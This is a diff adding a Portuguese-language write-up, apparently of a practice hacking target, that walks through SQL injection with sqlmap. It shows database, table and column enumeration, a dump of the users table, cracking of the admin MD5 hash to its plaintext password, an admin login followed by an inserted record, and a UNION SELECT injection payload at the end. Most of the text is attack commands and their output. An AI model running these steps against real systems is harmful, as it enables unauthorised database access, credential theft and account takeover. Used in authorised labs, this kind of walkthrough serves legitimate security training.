@@ -338,6 +338,196 @@ Priority: u=0, i
 
 **Comando sqlmap**: `sqlmap -r headers.txt --batch`
 
-- `sqlmap -r headers.txt --batch --dbs` 
+- `sqlmap -r headers.txt --batch --dbs`
 
 
+**Output**
+```bash
+[20:33:55] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40
+back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
+[20:33:55] [INFO] fetching database names
+[20:33:56] [INFO] retrieved: 'bancocn'
+[20:33:56] [INFO] retrieved: 'information_schema'
+available databases [2]:                                                                           
+[*] bancocn
+[*] information_schema
+```
+
+**Output [bancocn]** `sqlmap -r headers.txt --batch --tables`
+
+```bash
+Database:bancocn                                                                                                                                                            
+[4 tables]
++---------------------------------------+
+| categories                            |
+| pictures                              |
+| stats                                 |
+| users                                 |
++---------------------------------------+
+```
+
+> `sqlmap -r headers.txt --batch -D bancocn -T users --columns`
+
+```bash
+---
+[20:41:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40
+back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
+[20:41:32] [INFO] fetching columns for table 'users' in database 'bancocn'
+[20:41:34] [INFO] retrieved: 'id','mediumint(9)'
+[20:41:34] [INFO] retrieved: 'login','varchar(50)'
+[20:41:34] [INFO] retrieved: 'password','varchar(50)'
+Database: bancocn                                                                                                                                                                     
+Table: users
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | mediumint(9) |
+| login    | varchar(50)  |
+| password | varchar(50)  |
++----------+--------------+
+```
+
+> `sqlmap -r headers.txt --batch -D bancocn -T users -C id,login,password --dump`
+
+```bash
+---
+[20:42:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40
+back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
+[20:42:31] [INFO] fetching entries of column(s) 'id,login,password' for table 'users' in database 'bancocn'
+[20:42:32] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[20:42:32] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[20:42:32] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[20:42:32] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[20:42:32] [INFO] starting 12 processes 
+[20:42:37] [WARNING] no clear password(s) found                                                                                                                                       
+Database: bancocn
+Table: users
+[1 entry]
++----+-------+----------------------------------+
+| id | login | password                         |
++----+-------+----------------------------------+
+| 1  | admin | 7b71be0e85318117d2e514ce2a2e222c |
++----+-------+----------------------------------+
+```
+
+- [Hash Identifier](https://hashes.com/en/tools/hash_identifier)
+
+`7b71be0e85318117d2e514ce2a2e222c - Possible algorithms: MD5`
+
+- [MD5 Decryption](https://www.md5online.org/md5-decrypt.html)
+```
+LOGIN : admin
+Found : senhafoda
+(hash = 7b71be0e85318117d2e514ce2a2e222c)
+```
+
+Depois de acessar a conta do administrador, adicionei uma imagem no site (o backend retornou o comando SQL)
+- `INSERT INTO pictures (title, img, cat) VALUES ('Satoru','icon.jpg','1')`
+
+----
+
+**Output [information_schema]**
+
+```bash
+Database: information_schema
+[78 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHANGED_PAGE_BITMAPS                  |
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| FILES                                 |
+| GEOMETRY_COLUMNS                      |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_MUTEXES                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_SEMAPHORE_WAITS            |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TABLESPACES_ENCRYPTION         |
+| INNODB_TABLESPACES_SCRUBBING          |
+| INNODB_TRX                            |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| SPATIAL_REF_SYS                       |
+| STATISTICS                            |
+| SYSTEM_VARIABLES                      |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+```
+
+Alguns comandos que posso utilizar na URL das páginas (inserir código SQL)
+
+- `-{:id} union select 1,2,database()`
